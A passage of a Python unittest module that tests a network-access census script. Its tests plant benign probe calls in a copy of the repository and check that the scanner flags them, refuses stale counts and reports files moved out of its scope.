        with open(path, encoding="utf-8") as fh:
            expected = json.load(fh)
    probs = mod.problems(root, res, fig, expected)
    listing, table = io.StringIO(), io.StringIO()
    mod.render_sites(res, fig, listing)
    mod.render_table(res, fig, table)
    return _Run(res, fig, expected, probs, listing.getvalue(), table.getvalue())


TREE_KEY = ("tests/test_price_feed_census.py", "the tree run")   # parse_cache.derived's key for the tree's one derivation


def _tree():
    """The tree's one derivation, built on the first call in the process and the same object after (parse_cache.derived,
    which holds the collector off for the build and freezes what the build leaves tracked): the script's scan over ROOT
    and the pieces main composes from it (_run_of). The tree is never mutated."""
    return PC.derived(TREE_KEY, lambda: _run_of(script_module(ROOT), ROOT, script_module(ROOT).scan(ROOT)))


def tree_run(*flags):
    """The tree's own run, once per process and shared by the cases: (exit code, stdout, stderr) as
    `python3 scripts/network-inventory.py [--table] ROOT` prints them, from the one derivation (_tree): with no flag the
    listing, the problem lines after it on stdout; with --table the table on stdout and the problem lines on stderr; the exit
    code 1 when there is any problem line, else 0 (main's own composition, read for the order; main itself runs in every
    other run of this module, over the copy and the tiny roots, and the served class's command-line case holds this
    composition to a run of the file, through the served pass, which starts from it). Two roads and no other flag. With
    --table it composes the full tree's table in this process (render_table over the one derivation) and runs neither main
    nor the file: no run of the file prints the full tree's table, and the file's --table road is held to print
    render_table's output, with the problem lines on stderr and exit 1, over the two tiny roots (the tiny roots' case)."""
    if flags not in ((), ("--table",)):
        raise ValueError("tree_run takes no flag or --table alone, the two roads main renders: %r" % (flags,))
    run = _tree()
    tail = ("\n".join(run.problems) + "\n") if run.problems else ""
    rc = 1 if run.problems else 0
    return (rc, run.table, tail) if flags else (rc, run.listing + tail, "")


def summary(out):
    m = SUMMARY.search(out)
    return {k: int(v) for k, v in m.groupdict().items()} if m else None


def unclassified(out):
    """The file:line tokens the UNCLASSIFIED line names, as a set."""
    for ln in out.splitlines():
        if ln.startswith("UNCLASSIFIED "):
            return set(ln.split(": ", 1)[0].split()[1:])
    return set()


def gates(out):
    """The run's output without the site lines: the summary and the gate lines, for a failure message."""
    return "\n".join(ln for ln in out.splitlines() if not SITE_LINE.match(ln))


_COPY = []


def scope_copy():
    """One copy of the scanned scope per process (the declared roots, the named files, the script and its counts), made on
    first use under the run's temp root; every mutation a case makes is restored by that case's cleanup."""
    if not _COPY:
        root = tempfile.mkdtemp(prefix="census-scope-")
        for d in SCOPE_DIRS:
            shutil.copytree(os.path.join(ROOT, d), os.path.join(root, d), symlinks=True, ignore=shutil.ignore_patterns("__pycache__", "node_modules"))
        for f in SCOPE_FILES:
            os.makedirs(os.path.dirname(os.path.join(root, f)), exist_ok=True)
            if f == EXPECTED and not os.path.isfile(os.path.join(ROOT, f)):
                continue   # a tree without the committed counts: the script's own COUNTS gate reports the absence
            shutil.copy2(os.path.join(ROOT, f), os.path.join(root, f))
        _COPY.append(root)
    return _COPY[0]


def tearDownModule():
    for root in _COPY:
        shutil.rmtree(root, ignore_errors=True)
    del _COPY[:]


def _plant(rel, text, cleanup):
    """Write (or overwrite) rel under the copy and hand `cleanup` the undo (a new file is removed again, its made
    directories with it; an existing one is restored): a case passes its addCleanup, a shared run its undo list."""
    path = os.path.join(scope_copy(), rel)
    existed = os.path.exists(path)
    old = None
    if existed:
        with open(path, encoding="utf-8") as f:
            old = f.read()
    made = []
    d = os.path.dirname(path)
    while not os.path.isdir(d):
        made.append(d)
        d = os.path.dirname(d)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        f.write(text)

    def restore():
        if existed:
            with open(path, "w", encoding="utf-8") as f:
                f.write(old)
        else:
            os.remove(path)
            for m in made:
                os.rmdir(m)
    cleanup(restore)
    return path


def _append(rel, text, cleanup):
    with open(os.path.join(scope_copy(), rel), encoding="utf-8") as f:
        old = f.read()
    return _plant(rel, old + ("" if old.endswith("\n") else "\n") + text, cleanup)


def _replace_text(text, old, new, where):
    """`text` with its one occurrence of `old` replaced by `new`; an anchor that is absent or repeated in `where` is a broken
    mutation, not a pass. The served pass mutates kernel/kernel.py's text in memory through this; _replace, a file's."""
    if text.count(old) != 1:
        raise AssertionError("the mutation's anchor %r occurs %d times in %s, not once" % (old[:60], text.count(old), where))
    return text.replace(old, new)


def _replace(rel, old, new, cleanup):
    with open(os.path.join(scope_copy(), rel), encoding="utf-8") as f:
        text = f.read()
    return _plant(rel, _replace_text(text, old, new, rel), cleanup)


def _lines(path):
    with open(path, encoding="utf-8") as f:
        return f.read().splitlines()


class _Scope(unittest.TestCase):
    """Mutations over the scope copy, each undone by cleanup, and the assertions the copy's runs share."""

    def plant(self, rel, text):
        """Write (or overwrite) rel under the copy; a new file is removed again, an existing one restored."""
        return _plant(rel, text, self.addCleanup)

    def append(self, rel, text):
        return _append(rel, text, self.addCleanup)

    def replace(self, rel, old, new):
        return _replace(rel, old, new, self.addCleanup)

    def move(self, rel, to):
        root = scope_copy()
        src, dst = os.path.join(root, rel), os.path.join(root, to)
        os.makedirs(os.path.dirname(dst), exist_ok=True)
        os.rename(src, dst)

        def restore():
            os.rename(dst, src)
            d = os.path.dirname(dst)
            while d != root and not os.listdir(d):
                os.rmdir(d)
                d = os.path.dirname(d)
        self.addCleanup(restore)

    def lines(self, path):
        return _lines(path)

    def assertRefused(self, rc, out, *needles):
        self.assertNotEqual(rc, 0, "the run must exit non-zero:\n" + gates(out))
        for n in needles:
            self.assertIn(n, out, "the run must name %r:\n%s" % (n, gates(out)))

    def assertClean(self, rc, out):
        self.assertEqual(rc, 0, "the run must exit 0:\n" + gates(out))
        got = summary(out)
        self.assertIsNotNone(got, "the summary line has the committed shape (the totals, the class counts, the files):\n" + gates(out))
        self.assertEqual(got["unclassified"], 0)

    def assertCommandLine(self, root, rc, out, timeout):
        """The file run as the command line runs it over root (_command_line) exits 1 and prints `out`, the in-process run's
        stdout, byte for byte as UTF-8 (CI and the box run a UTF-8 locale; another locale fails here loudly), and `rc`, that
        run's exit code, is 1 too: the documented exit code, which only a run of the file's own entry holds. A difference
        names the first differing lines."""
        code, got, err = _command_line(root, timeout)
        self.assertEqual((rc, code), (1, 1), "the in-process run and the command line each exit 1 over %s (in process %r, command "
                         "line %r; stderr: %s)" % (root, rc, code, err[-400:]))
        if got != out.encode("utf-8"):
            diff = list(difflib.unified_diff(out.splitlines(), got.decode("utf-8", "replace").splitlines(), "in process", "command line",
                                             lineterm="", n=0))
            self.fail("the command line's stdout over %s is not the in-process run's (%d bytes against the in-process %d):\n%s\n(stderr: %s)"
                      % (root, len(got), len(out.encode("utf-8")), "\n".join(diff[:40]), err[-400:]))

    def assertTableRoad(self, how, got, want):
        """One --table run, (exit code, stdout, stderr) as `how` made it (in process or the command line), equals `want`: exit 1, the
        table render_table writes from a scan made apart from main (_run_of), and the problem lines on stderr, joined, with a
        newline. Compared part by part, so a failure names the part; a stdout difference names its first differing lines."""
        (rc, out, err), (wrc, wout, werr) = got, want
        self.assertEqual(rc, wrc, "%s: --table over a root with problem lines exits %d (got %r; stderr: %s)" % (how, wrc, rc, err[-400:]))
        if out != wout:
            diff = list(difflib.unified_diff(wout.splitlines(), out.splitlines(), "render_table", how, lineterm="", n=0))
            self.fail("%s: --table's stdout is not render_table's output (%d characters against %d):\n%s" % (how, len(out), len(wout), "\n".join(diff[:40])))
        self.assertEqual(err, werr, "%s: --table writes the problem lines to stderr, joined, with a newline" % how)

    def assertListed(self, out, pattern, msg=""):
        """A site line matching the pattern is in the run's listing (the failure quotes the lines of that file, not the run)."""
        if not re.search(pattern, out, re.M):
            head = pattern.split(":")[0].replace("\\", "")
            self.fail("no listed line matches %r%s\n%s\n%s" % (pattern, (": " + msg) if msg else "", gates(out),
                      "\n".join(ln for ln in out.splitlines() if ln.startswith(head))))


_SHARED = {}   # run name -> (exit code, stdout) of the one run the classes naming it read


class _SharedRun(_Scope):
    """Classes whose row-less mutation cases read ONE run over the scope copy. Every class naming the same RUN plants its
    mutations (`mutate`, recording line numbers in cls.at) on the copy in definition order, the script runs once, and every
    mutation is undone before any case runs, so a case of the class with a mutation of its own still starts from the clean
    copy; the cases read the run as self.rc and self.out. One run of the script per shared run instead of one per case: the
    serial CI cell's growth after the third round (2026-09-22) was these runs, at about 3.5 s each on the box, and the cell
    reached its 25-minute wall; since the fifth round (2026-09-23) a run is an in-process main over the copy (inventory),
    about 2.4 s on 3.10, and the runs are walk, shell, browser, credentials and clean (the last two members of the clean
    run assert the whole run clean, and its one plant is a call the scan does not see by construction).

    A run shared this way is exactly as strict as one run per case because of what the shared cases assert: a property
    keyed on a file and a line (a site named UNCLASSIFIED at file:line, the tag on that line's listing, an IMPORT line at
    file:line, a STALE ROW or COUNTS line naming the case's own key, a line NOT listed), never a figure of the whole run.
    The mutations touch different files, or blocks appended in turn to one file with each block's lines recorded as it
    lands, so no block moves another's lines; a second block adds sites at its own lines only, which can fail another
    case's negative (a line it says is no site becoming one) and cannot satisfy its positive. Names two blocks plant in one
    Python file differ, since the scan resolves a module constant by its last assignment. A case that asserts a figure of
    the whole run (a class count, an empty UNCLASSIFIED set, a clean summary equal to the tree's) keeps a run of its own."""

    RUN = None      # the run the class reads; classes naming the same run mutate one copy and read one output
    MEMBERS = {}    # run name -> the classes naming it, in definition order (the order their mutations land)
    at = None       # the line numbers `mutate` recorded, per class

    def __init_subclass__(cls, **kw):
        super().__init_subclass__(**kw)
        if cls.RUN:
            _SharedRun.MEMBERS.setdefault(cls.RUN, []).append(cls)

    @classmethod
    def mutate(cls, cleanup):
        """Plant the class's mutations with _plant, _append and _replace, passing `cleanup`, and record lines in cls.at."""
        raise NotImplementedError

    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        if cls.RUN not in _SHARED:
            undo = []
            try:
                for member in _SharedRun.MEMBERS[cls.RUN]:
                    member.at = {}
                    member.mutate(undo.append)
                rc, out, _ = inventory(scope_copy())
                _SHARED[cls.RUN] = (rc, out)
            finally:
                for f in reversed(undo):
                    f()
        cls.rc, cls.out = _SHARED[cls.RUN]


def _expected():
    with open(os.path.join(ROOT, EXPECTED), encoding="utf-8") as f:
        return json.load(f)


class TheCensusRunsFromTheSuite(_SharedRun):
    """The instrument is run by the suite (and so by CI's Python job), against counts committed beside it. The copy-clean
    control reads the shared clean run (RUN clean, the fifth round), whose one plant is the residual class's calls the scan
    does not see (TheResidualClassIsStatedAndHeld); this class plants nothing. The other cases run the script themselves:
    the tree's one derivation (tree_run), a run with a flag, or a run over the copy with a mutation of the whole listing
    (kernel/kernel.py moved or emptied), each a run of its own."""

    RUN = "clean"

    @classmethod
    def mutate(cls, cleanup):
        """The control: no mutation of its own."""

    def test_the_tree_runs_clean_against_the_committed_counts(self):
        self.assertTrue(os.path.isfile(os.path.join(ROOT, EXPECTED)), "%s exists: the committed counts the run is compared against "
                        "(python3 %s --write-expected on a clean tree writes it)" % (EXPECTED, INVENTORY))
        expected = _expected()
        rc, out, err = tree_run()
        self.assertClean(rc, out)
        got = summary(out)
        self.assertIsNotNone(got, "the summary line has the committed shape")
        for name in ("sites", "roads", "local_roads", "local_sites"):
            self.assertEqual(got[name], expected[name], name)
        self.assertEqual((got["external"], got["runtime"], got["computed"], got["dom"]),
                         tuple(expected["classes"][c] for c in ("external-program", "runtime-program", "browser-computed-url", "browser-dom-loads")))
        self.assertGreater(got["sites"], 200, "a floor: the scan opened the runtime trees")
        self.assertEqual(sum(expected["per_road"].values()) + got["computed"], got["sites"], "every site has a road or is the computed-URL class")
        self.assertEqual(sum(expected["per_key"].values()), got["sites"], "the committed row-key counts sum to the sites")

    def test_the_copy_runs_clean_like_the_tree(self):
        """The control for every mutation case below: the copy reads as the tree does. The clean run it reads carries the
        residual class's calls, which the scan does not see by construction (TheResidualClassIsStatedAndHeld), so the run is
        the tree's; a copy that lost a file, or a scan that opened fewer of them, differs here whatever the plant."""
        rc, out = self.rc, self.out
        self.assertEqual(rc, 0, "the run must exit 0:\n" + gates(out))
        rc2, out2, _ = tree_run()
        line = lambda text: re.sub(r"; \d+ files scanned.*$", "", next(ln for ln in text.splitlines() if ln.startswith("--- ")))
        self.assertEqual(line(out), line(out2), "the copy's summary is the tree's (a copy that reads differently is a broken copy, not a pin)")

    def test_the_committed_counts_are_the_scripts_own_output(self):
        """--write-expected on the clean copy writes what the tree carries: the file has one author, the script."""
        self.plant(EXPECTED, "{}\n")
        rc, out, _ = inventory(scope_copy(), "--write-expected")
        self.assertEqual(rc, 0, gates(out))
        with open(os.path.join(scope_copy(), EXPECTED), encoding="utf-8") as f:
            written = json.load(f)
        self.assertEqual(written, _expected(), "the committed counts are stale: run python3 %s --write-expected and commit the diff" % INVENTORY)

    def test_a_scan_that_loses_a_file_is_refused_naming_the_figure(self):
        """The round's reproduction: kernel/kernel.py one directory down. The flat walk of the earlier script found 165 sites
        where it had found 266 and exited 0; now the moved file is scanned where it sits, so every row keyed on its old path
        is stale, every site under the new path has no row, and the row-key counts differ."""
        self.move("kernel/kernel.py", "kernel/sub/kernel.py")
        rc, out, _ = inventory(scope_copy())
        self.assertRefused(rc, out, "STALE ROW kernel/kernel.py:_refresh_remote_prices.work",
                           "COUNTS per_key kernel/kernel.py:_refresh_remote_prices.work: the committed count is 1, this run found None",
                           "UNCLASSIFIED")
        self.assertTrue(any(t.startswith("kernel/sub/kernel.py:") for t in unclassified(out)), "the moved file's sites are found and named at their new path")

    def test_a_scan_that_loses_sites_is_refused_on_the_total(self):
        """A file gone (emptied, not moved): the total is the loud figure, beside the stale rows."""
        self.plant("kernel/kernel.py", "")
        rc, out, _ = inventory(scope_copy())
        self.assertRefused(rc, out, "STALE ROW kernel/kernel.py:_refresh_remote_prices.work")
        expected = _expected()
        lost = sum(v for k, v in expected["per_key"].items() if k.startswith("kernel/kernel.py:"))
        self.assertGreater(lost, 90, "kernel/kernel.py carries a third of the sites: the figure the round measured")
        self.assertRefused(rc, out, "COUNTS sites: the committed count is %d, this run found %d" % (expected["sites"], expected["sites"] - lost))

    def test_write_expected_is_refused_while_any_other_gate_fails(self):
        self.move("kernel/kernel.py", "kernel/sub/kernel.py")
        path = os.path.join(scope_copy(), EXPECTED)
        before = None
        if os.path.isfile(path):
            with open(path, encoding="utf-8") as f:
                before = f.read()
        rc, out, _ = inventory(scope_copy(), "--write-expected")
        self.assertRefused(rc, out, "not written: " + EXPECTED, "STALE ROW")
        after = None
        if os.path.isfile(path):
            with open(path, encoding="utf-8") as f:
                after = f.read()
        self.assertEqual(after, before, "the counts file is untouched by a refused write")

    def test_no_sites_and_a_missing_root_are_each_refused_by_name(self):
        """Two tiny roots (no sites; the kernel root missing), each run on both of main's roads, the listing and --table, in this
        process (inventory) and as the command line runs the file (_command_line; the fifth round of the review found the
        documented command held by no real run, fresh-1). With no flag: exit 1 from both and the same stdout, byte for byte. The
        child is a run of the file's own entry, `sys.exit(main(sys.argv[1:]))` under `if __name__ == "__main__"`, which every
        in-process run skips, so a lost sys.exit, a deleted block or an entry that drops main's return code exits 0 here (M32 to
        M34), at about 0.06 s a child. With --table (the sixth round, tests-2 and extra7-4: since the cost cut no run reached
        main's --table branch, while the ledger entry says its block is that road's output), each run (the child with --table
        before the root) exits 1 and prints the table render_table writes from a scan of the root made here apart from
        main (_run_of, never inventory(tiny, "--table"), which would hold main to itself), with the problem lines on stderr,
        joined, with a newline (assertTableRoad). A renderer swap, the problem lines routed to stdout and an exit code of 0 under
        --table are each red in both halves, and an entry that drops --table from argv in the command-line half only (the
        round's record). So a run of the file covers both roads over the tiny roots and the listing road over a full copy (the
        served class's command-line case); no child runs the full tree's --table, whose table tree_run composes in process. No
        child runs over a clean tree for exit 0: an entry that always exits non-zero fails the documented command on every tree,
        which is loud."""
        for missing in (None, "kernel"):
            tiny = tempfile.mkdtemp(prefix="census-tiny-")
            for d in SCOPE_DIRS:
                if d != missing:
                    os.makedirs(os.path.join(tiny, d))
            os.makedirs(os.path.join(tiny, "scripts"))
            shutil.copy2(os.path.join(ROOT, INVENTORY), os.path.join(tiny, INVENTORY))
            rc, out, _ = inventory(tiny)
            self.assertRefused(rc, out, "NO SITES found", "SCOPE the named file bootstrap.sh is missing", "COUNTS %s is missing" % EXPECTED)
            if missing:
                self.assertIn("SCOPE the declared root kernel/ is missing", gates(out))
            else:
                self.assertNotIn("declared root", gates(out))
            self.assertCommandLine(tiny, rc, out, timeout=60)
            mod = script_module(tiny)
            run = _run_of(mod, tiny, mod.scan(tiny))
            want = (1, run.table, "\n".join(run.problems) + "\n")
            self.assertTableRoad("in process", inventory(tiny, "--table"), want)
            code, got, err = _command_line(tiny, 60, "--table")
            self.assertTableRoad("the command line", (code, got.decode("utf-8", "replace"), err), want)


class TheWalkIsRecursiveOverTheDeclaredScope(_SharedRun):
    """The declared scope and the walk are held equal by execution: a file below a root and a hook of any kind are opened.
    One run (_SharedRun) carries the five plants: a Python file one directory down, a site appended to the node hook, a new
    shell hook, a Python fixture below the webview root and a program reference in kernel/credentials.py; each case's
    property is a file's own line in UNCLASSIFIED or in a gate line, or a file's absence from them. Since the fifth round
    the run also carries the primitive list's two blocks in kernel/credentials.py and the literal-URL function in
    kernel/kernel.py (ThePrimitiveListIsKeptHonest, ASecondSiteInsideARowedFunctionIsRed), each keyed on its own lines, and
    since the sixth round two plants in vendor/track-changents, a directory the walk does not read
    (TheVendoredCopyIsStatedOutsideTheWalk, keyed on their files)."""

    RUN = "walk"

    @classmethod
    def mutate(cls, cleanup):
        _plant("kernel/sub/extra.py", "import urllib.request\n\ndef _warm():\n    return urllib.request.urlopen(%r, timeout=4)\n" % FEED_LITERAL, cleanup)
        # a node hook (the one in the tree, hooks/romp-track-bash-guard.mjs, is read: a site appended to it is named), a new
        # shell hook with the ordinary ssh spelling, and a Python fixture below the webview root, which is skipped by kind
        _append("hooks/romp-track-bash-guard.mjs", "fetch(%r);\n" % FEED_LITERAL, cleanup)
        _plant("hooks/probe.sh", "#!/usr/bin/env bash\nssh TESTHOST uptime\n", cleanup)
        # a dotted hook outside the five extensions (a .bash) is read for its shebang like an undotted one: kind_of's early
        # return for a dotted name is gone (the fourth round of the review of PR 878, fresh-2)
        _plant("hooks/probe.bash", BASH_HOOK_TEXT, cleanup)
        _plant("ui/webview/anchor-map-fixtures/probe.py", "import urllib.request\nurllib.request.urlopen(%r)\n" % FEED_LITERAL, cleanup)
        _append("kernel/credentials.py", '\n_PROBE_HOST = "tools/probe-host.mjs"\n', cleanup)

    def test_a_site_one_directory_down_is_found(self):
        self.assertRefused(self.rc, self.out, "UNCLASSIFIED")
        self.assertIn("kernel/sub/extra.py:4", unclassified(self.out))

    def test_every_hook_is_scanned_whatever_its_extension_and_a_fixture_of_another_kind_is_not(self):
        out = self.out
        self.assertRefused(self.rc, out, "UNCLASSIFIED")
        named = unclassified(out)
        self.assertIn("hooks/probe.sh:2", named, "ssh <host> <command> in a shell hook is a site")
        self.assertIn("hooks/probe.bash:2", named, "a dotted hook outside the five extensions is read for its shebang: a curl in a .bash hook is a site")
        self.assertTrue(any(t.startswith("hooks/romp-track-bash-guard.mjs:") for t in named), "the node hook is scanned: %r" % named)
        self.assertFalse(any("anchor-map-fixtures" in t for t in named), "ui/ is read for the browser kinds only")
        self.assertFalse([ln for ln in out.splitlines() if ln.startswith("PARSE")], "the fixture directory's Python is not parsed:\n" + gates(out))

    def test_a_program_the_kernel_runs_from_an_unscanned_directory_is_a_gate(self):
        self.assertRefused(self.rc, self.out, "PROGRAM kernel/credentials.py:", "names 'tools/probe-host.mjs'")


# The sixth round's text on the vendored copy (extra7-1, 2026-09-24): one text in three homes, the script's docstring (its scope
# paragraph), SECURITY.md's Network access section (tests/test_security_price_feed.py holds that home) and the ledger entry's census
# paragraph. The review declined walking the vendored files (a widening under the rule on instruments' limits), so the text states
# the walk's true population; TheVendoredCopyIsStatedOutsideTheWalk holds it to the behaviour and to the tree.
VENDORED_SCOPE = ("vendor/track-changents is runtime code, reached by relative imports from walked files (the dashboard's ui sources, a "
                  "session hook and the file-comments host) and by install.sh's links into ~/.claude, and it is not walked. A load written "
                  "there is no site and no line, and the import gate does not read its imports.")
VENDORED = "vendor/track-changents"
# the places the text names, by the first path segment of the walked file that imports the copy: the dashboard's ui sources, a
# session hook, and the file-comments host (tools/file-comments-host.mjs, the one program the kernel starts from tools/)
VENDORED_IMPORTERS = ["hooks", "tools", "ui"]
# two plants in the copy, each a file runtime code reaches (the engine the dashboard's bundles carry, the guard install.sh links into
# ~/.claude), each carrying an absolute fetch, an https client and a package the census does not know: every one a line were the
# file walked (an UNCLASSIFIED site, an IMPORT line)
VENDORED_PLANTS = (VENDORED + "/engine.js", VENDORED + "/hooks/track-guard.mjs")
VENDORED_PLANT = ('const https = require("https");\nhttps.get("https://example.invalid/vendored");\n'
                  'fetch("https://example.invalid/vendored");\nimport("probe-vendored-package");\n')
# The /dist and /media entry's reason names the vendored files the page bundles carry (regression-1, extra6-4 and extra7-3): the
# webview leg's census, ui/webview/spacer-measure.test.ts, holds its OUTSIDE list equal to esbuild's metafile of the shipped webview
# config by execution, and TheVendoredCopyIsStatedOutsideTheWalk holds the reason's names to that list
SPACER_MEASURE = os.path.join("ui", "webview", "spacer-measure.test.ts")
DIST_SOURCES = ("/dist serves the bundles esbuild builds from three sources, none of it read as served text: the scanned ui and "
                "vscode-extension/src sources; the vendor/track-changents files they import, directly or through each other, which the "
                "walk does not read (")
DIST_PACKAGES = "; and the node_modules packages KNOWN_JS_IMPORTS names, together with the packages those depend on (text/javascript)."


class TheVendoredCopyIsStatedOutsideTheWalk(_SharedRun):
    """vendor/track-changents is runtime code the walk does not read (the sixth round, extra7-1): the review ruled the text true to
    the walk's population rather than a wider walk, and this class holds the text to the behaviour and to the tree. The walk run
    carries its two plants in the copy (VENDORED_PLANTS, each a file the copy does not have, so each is a new file there, removed
    again with the directories it made); the case asserts no line of the run names them, a property keyed on their files. The
    other cases read the tree: the text in the docstring's scope paragraph and the ledger entry's census paragraph (SECURITY.md's
    home is held by tests/test_security_price_feed.py), the places the text names as the walked files that import the copy, read
    by the script's own walk and specifier reader, install.sh's links, and the /dist and /media entry's reason (regression-1,
    extra6-4 and extra7-3)."""

    RUN = "walk"

    @classmethod
    def mutate(cls, cleanup):
        for rel in VENDORED_PLANTS:
            _plant(rel, VENDORED_PLANT, cleanup)

    def test_a_load_and_an_import_written_there_are_no_site_and_no_line(self):
        named = [ln for ln in self.out.splitlines() if VENDORED in ln or "example.invalid/vendored" in ln or "probe-vendored-package" in ln]
        self.assertEqual(named, [], "a fetch, an https client and an unknown package planted in %s are no site and no line, as the "
                         "text says (a walk that reads the copy lists them here, and the text must say so first)" % ", ".join(VENDORED_PLANTS))

    def test_the_text_stands_in_the_docstrings_scope_paragraph_and_the_ledgers_census_paragraph(self):
        with open(os.path.join(ROOT, INVENTORY), encoding="utf-8") as f:
            doc = ast.get_docstring(ast.parse(f.read())) or ""
        scope = [" ".join(p.split()) for p in doc.split("\n\n") if p.startswith("The walk is recursive over every declared root")]
        self.assertEqual(len(scope), 1, "the docstring has one scope paragraph")
        self.assertIn(VENDORED_SCOPE, scope[0], "the docstring's scope paragraph states the vendored copy outside the walk")
        with open(os.path.join(ROOT, LEDGER), encoding="utf-8") as f:
            text = f.read()
        paragraphs = [" ".join(p.split()) for p in text.split("\n\n") if DISCLOSURE[1:] in " ".join(p.split())]
        self.assertEqual(len(paragraphs), 1, "one paragraph of %s carries the disclosure sentence" % LEDGER)
        self.assertIn(VENDORED_SCOPE, paragraphs[0], "the census paragraph states the vendored copy outside the walk")
        self.assertLess(paragraphs[0].index("Its walk is recursive over"), paragraphs[0].index(VENDORED_SCOPE),
                        "the census paragraph states it after the walk it qualifies")

    def test_the_places_the_text_names_are_the_walked_files_that_import_the_copy_and_install_links_it(self):
        """The text's population read from the tree: every relative specifier the import gate reads in a walked JavaScript file (the
        tree derivation's files, the script's kind_of, _js_specifiers and _js_package, which passes a relative specifier as the
        tree's own module) that resolves to a file under the copy, grouped by the importing file's first path segment, comes from
        exactly the three places the text names; and install.sh links files of the copy into ~/.claude."""
        mod = script_module(ROOT)
        js_roots = tuple(d + "/" for d in mod.JS_ROOTS)
        places = {}
        for rel in _tree().res.files:
            if mod.kind_of(os.path.join(ROOT, rel), os.path.basename(rel), rel.startswith(js_roots)) != "js":
                continue
            with open(os.path.join(ROOT, rel), encoding="utf-8", errors="replace") as f:
                for i, ln in enumerate(f.read().splitlines(), 1):
                    s = ln.strip()
                    if s.startswith(("//", "*", "/*")):
                        continue
                    for m in mod._js_specifiers(s):
                        spec = m.group(2)
                        if not spec.startswith(".") or mod._js_package(spec) is not None:
                            continue
                        target = os.path.normpath(os.path.join(os.path.dirname(rel), spec)).replace(os.sep, "/")
                        if target.startswith(VENDORED + "/") and os.path.isfile(os.path.join(ROOT, target)):
                            places.setdefault(rel.split("/")[0], []).append("%s:%d %s" % (rel, i, target))
        self.assertEqual(sorted(places), VENDORED_IMPORTERS, "the walked files that import the copy by a relative path are the "
                         "dashboard's ui sources, a session hook and the file-comments host, the three the text names: %r" % places)
        with open(os.path.join(ROOT, "install.sh"), encoding="utf-8") as f:
            install = f.read()
        self.assertRegex(install, r'(?m)^_tc="\$ROMP_DIR/%s"$' % re.escape(VENDORED), "install.sh names the copy it links from")
        self.assertIn('ln -sfn "$target" "$link"', install, "install.sh's _link_tc links (a symbolic link)")
        self.assertTrue(re.findall(r'(?m)^\s*_link_tc "\$_tc/[^"]+" "\$HOME/\.claude/[^"]+"$', install),
                        "install.sh links files of the copy into ~/.claude")

    def test_the_dist_entrys_reason_names_the_three_sources_and_the_vendored_files_the_bundles_carry(self):
        """A source pin on the reason's words: the three sources (regression-1, extra6-4 and extra7-3) and the vendored files named
        in it, equal both ways to the vendored entries of ui/webview/spacer-measure.test.ts's OUTSIDE list. The executed proof of
        those names is that webview leg, which builds the shipped webview config in memory and holds OUTSIDE equal to esbuild's
        metafile; the extension's bundle, the other one /dist serves, carried no vendored file and no package outside
        KNOWN_JS_IMPORTS at the metafile read the round recorded, and no test here builds it."""
        reason = script_module(ROOT).SERVED_ALLOW[DIST_KEY][1]
        self.assertIn(DIST_SOURCES, reason, "the reason names the three sources")
        self.assertIn(DIST_PACKAGES, reason, "the reason names the packages' dependencies too")
        named = reason.split(DIST_SOURCES, 1)[1].split(")", 1)[0]
        named = [n.strip() for n in re.split(r", | and ", named)]
        with open(os.path.join(ROOT, SPACER_MEASURE), encoding="utf-8") as f:
            src = f.read()
        m = re.search(r"\n  const OUTSIDE = \[(.*?)\n  \];", src, re.S)
        self.assertTrue(m, "%s carries the OUTSIDE list, the modules a page bundle loads from outside ui/webview" % SPACER_MEASURE)
        outside = re.findall(r'"%s/([^"]+)"' % re.escape(VENDORED), m.group(1))
        self.assertTrue(outside, "the OUTSIDE list names vendored modules")
        self.assertEqual(sorted(named), sorted(outside), "the reason's vendored files are the ones the page bundles load (OUTSIDE in %s)"
                         % SPACER_MEASURE)


MUTANT_PROGRAMS = '''

def _probe_sh():
    return subprocess.run(["sh", "-c", "true"], check=False)

def _probe_node():
    return subprocess.run(["node", "-e", "1"], check=False)

def _probe_python():
    return subprocess.run([sys.executable, "-m", "pip", "download", "x"], check=False)

def _probe_argv(argv):
    return subprocess.Popen(argv)

def _probe_git_remote():
    return subprocess.run(["git", "remote", "update"], check=False)

def _probe_ps():
    return subprocess.run(["ps", "-o", "pid="], check=False)
'''


class AnExternalProgramIsNeverLocalByDefault(_SharedRun):
    """A shell, an interpreter, the running python, an argv the code does not spell out and a git subcommand that can fetch
    are not placed by any default rule: each needs a row. A fixed literal of a local tool still is, and the committed row-key
    count catches it as a new key. The block is appended to kernel/credentials.py in the shared credentials run, the first
    of its blocks (the fifth round; a run of its own before), its lines recorded as it lands; each property is one of those
    lines or the block's own row key, and the block imports nothing, so the run's IMPORT set, which the import-gate case
    holds equal to its own lines, is untouched."""

    RUN = "credentials"

    @classmethod
    def mutate(cls, cleanup):
        lines = _lines(_append("kernel/credentials.py", MUTANT_PROGRAMS, cleanup))
        cls.at.update({name: next(i + 2 for i, ln in enumerate(lines) if ln.startswith("def %s(" % name))
                       for name in ("_probe_sh", "_probe_node", "_probe_python", "_probe_argv", "_probe_git_remote", "_probe_ps")})

    def test_each_spelling_needs_a_row_and_a_fixed_local_tool_is_a_new_key(self):
        at, rc, out = self.at, self.rc, self.out
        self.assertRefused(rc, out, "UNCLASSIFIED")
        named = unclassified(out)
        for name in ("_probe_sh", "_probe_node", "_probe_python", "_probe_argv", "_probe_git_remote"):
            self.assertIn("kernel/credentials.py:%d" % at[name], named, "%s is unclassified without a row" % name)
        self.assertNotIn("kernel/credentials.py:%d" % at["_probe_ps"], named, "a fixed literal of a local tool is placed by the default rule")
        self.assertRefused(rc, out, "COUNTS per_key kernel/credentials.py:_probe_ps: the committed count is None, this run found 1")
        for name in ("_probe_sh", "_probe_node", "_probe_python", "_probe_argv"):
            self.assertListed(out, r"kernel/credentials\.py:%d  .*  in %s  -> UNCLASSIFIED \[external-program\]" % (at[name], name),
                             "the site is listed in its class, so the table's count moves with it")

    def test_the_class_members_are_listed_with_their_road_and_not_set_aside(self):
        rc, out, _ = tree_run()
        self.assertEqual(rc, 0, "the run must exit 0:\n" + gates(out))
        self.assertListed(out, r"kernel/judge\.py:\d+  run  sh -c  in _serve_fault  -> local-program \[external-program\]",
                         "a shell on a local road keeps its row and is marked as the class")
        self.assertListed(out, r"kernel/kernel\.py:\d+  run  /bin/sh  in _watch_run  -> predicate-watch \[runtime-program\]")
        self.assertListed(out, r"kernel/credentials\.py:\d+  run  RUNTIME-SUPPLIED\(cmd\) SHELL  in run_helper  -> api-key-helper \[runtime-program\]")
        self.assertClean(rc, out)
        rows = [ln for ln in out.splitlines() if SITE_LINE.match(ln) and "  dom-load  " not in ln]
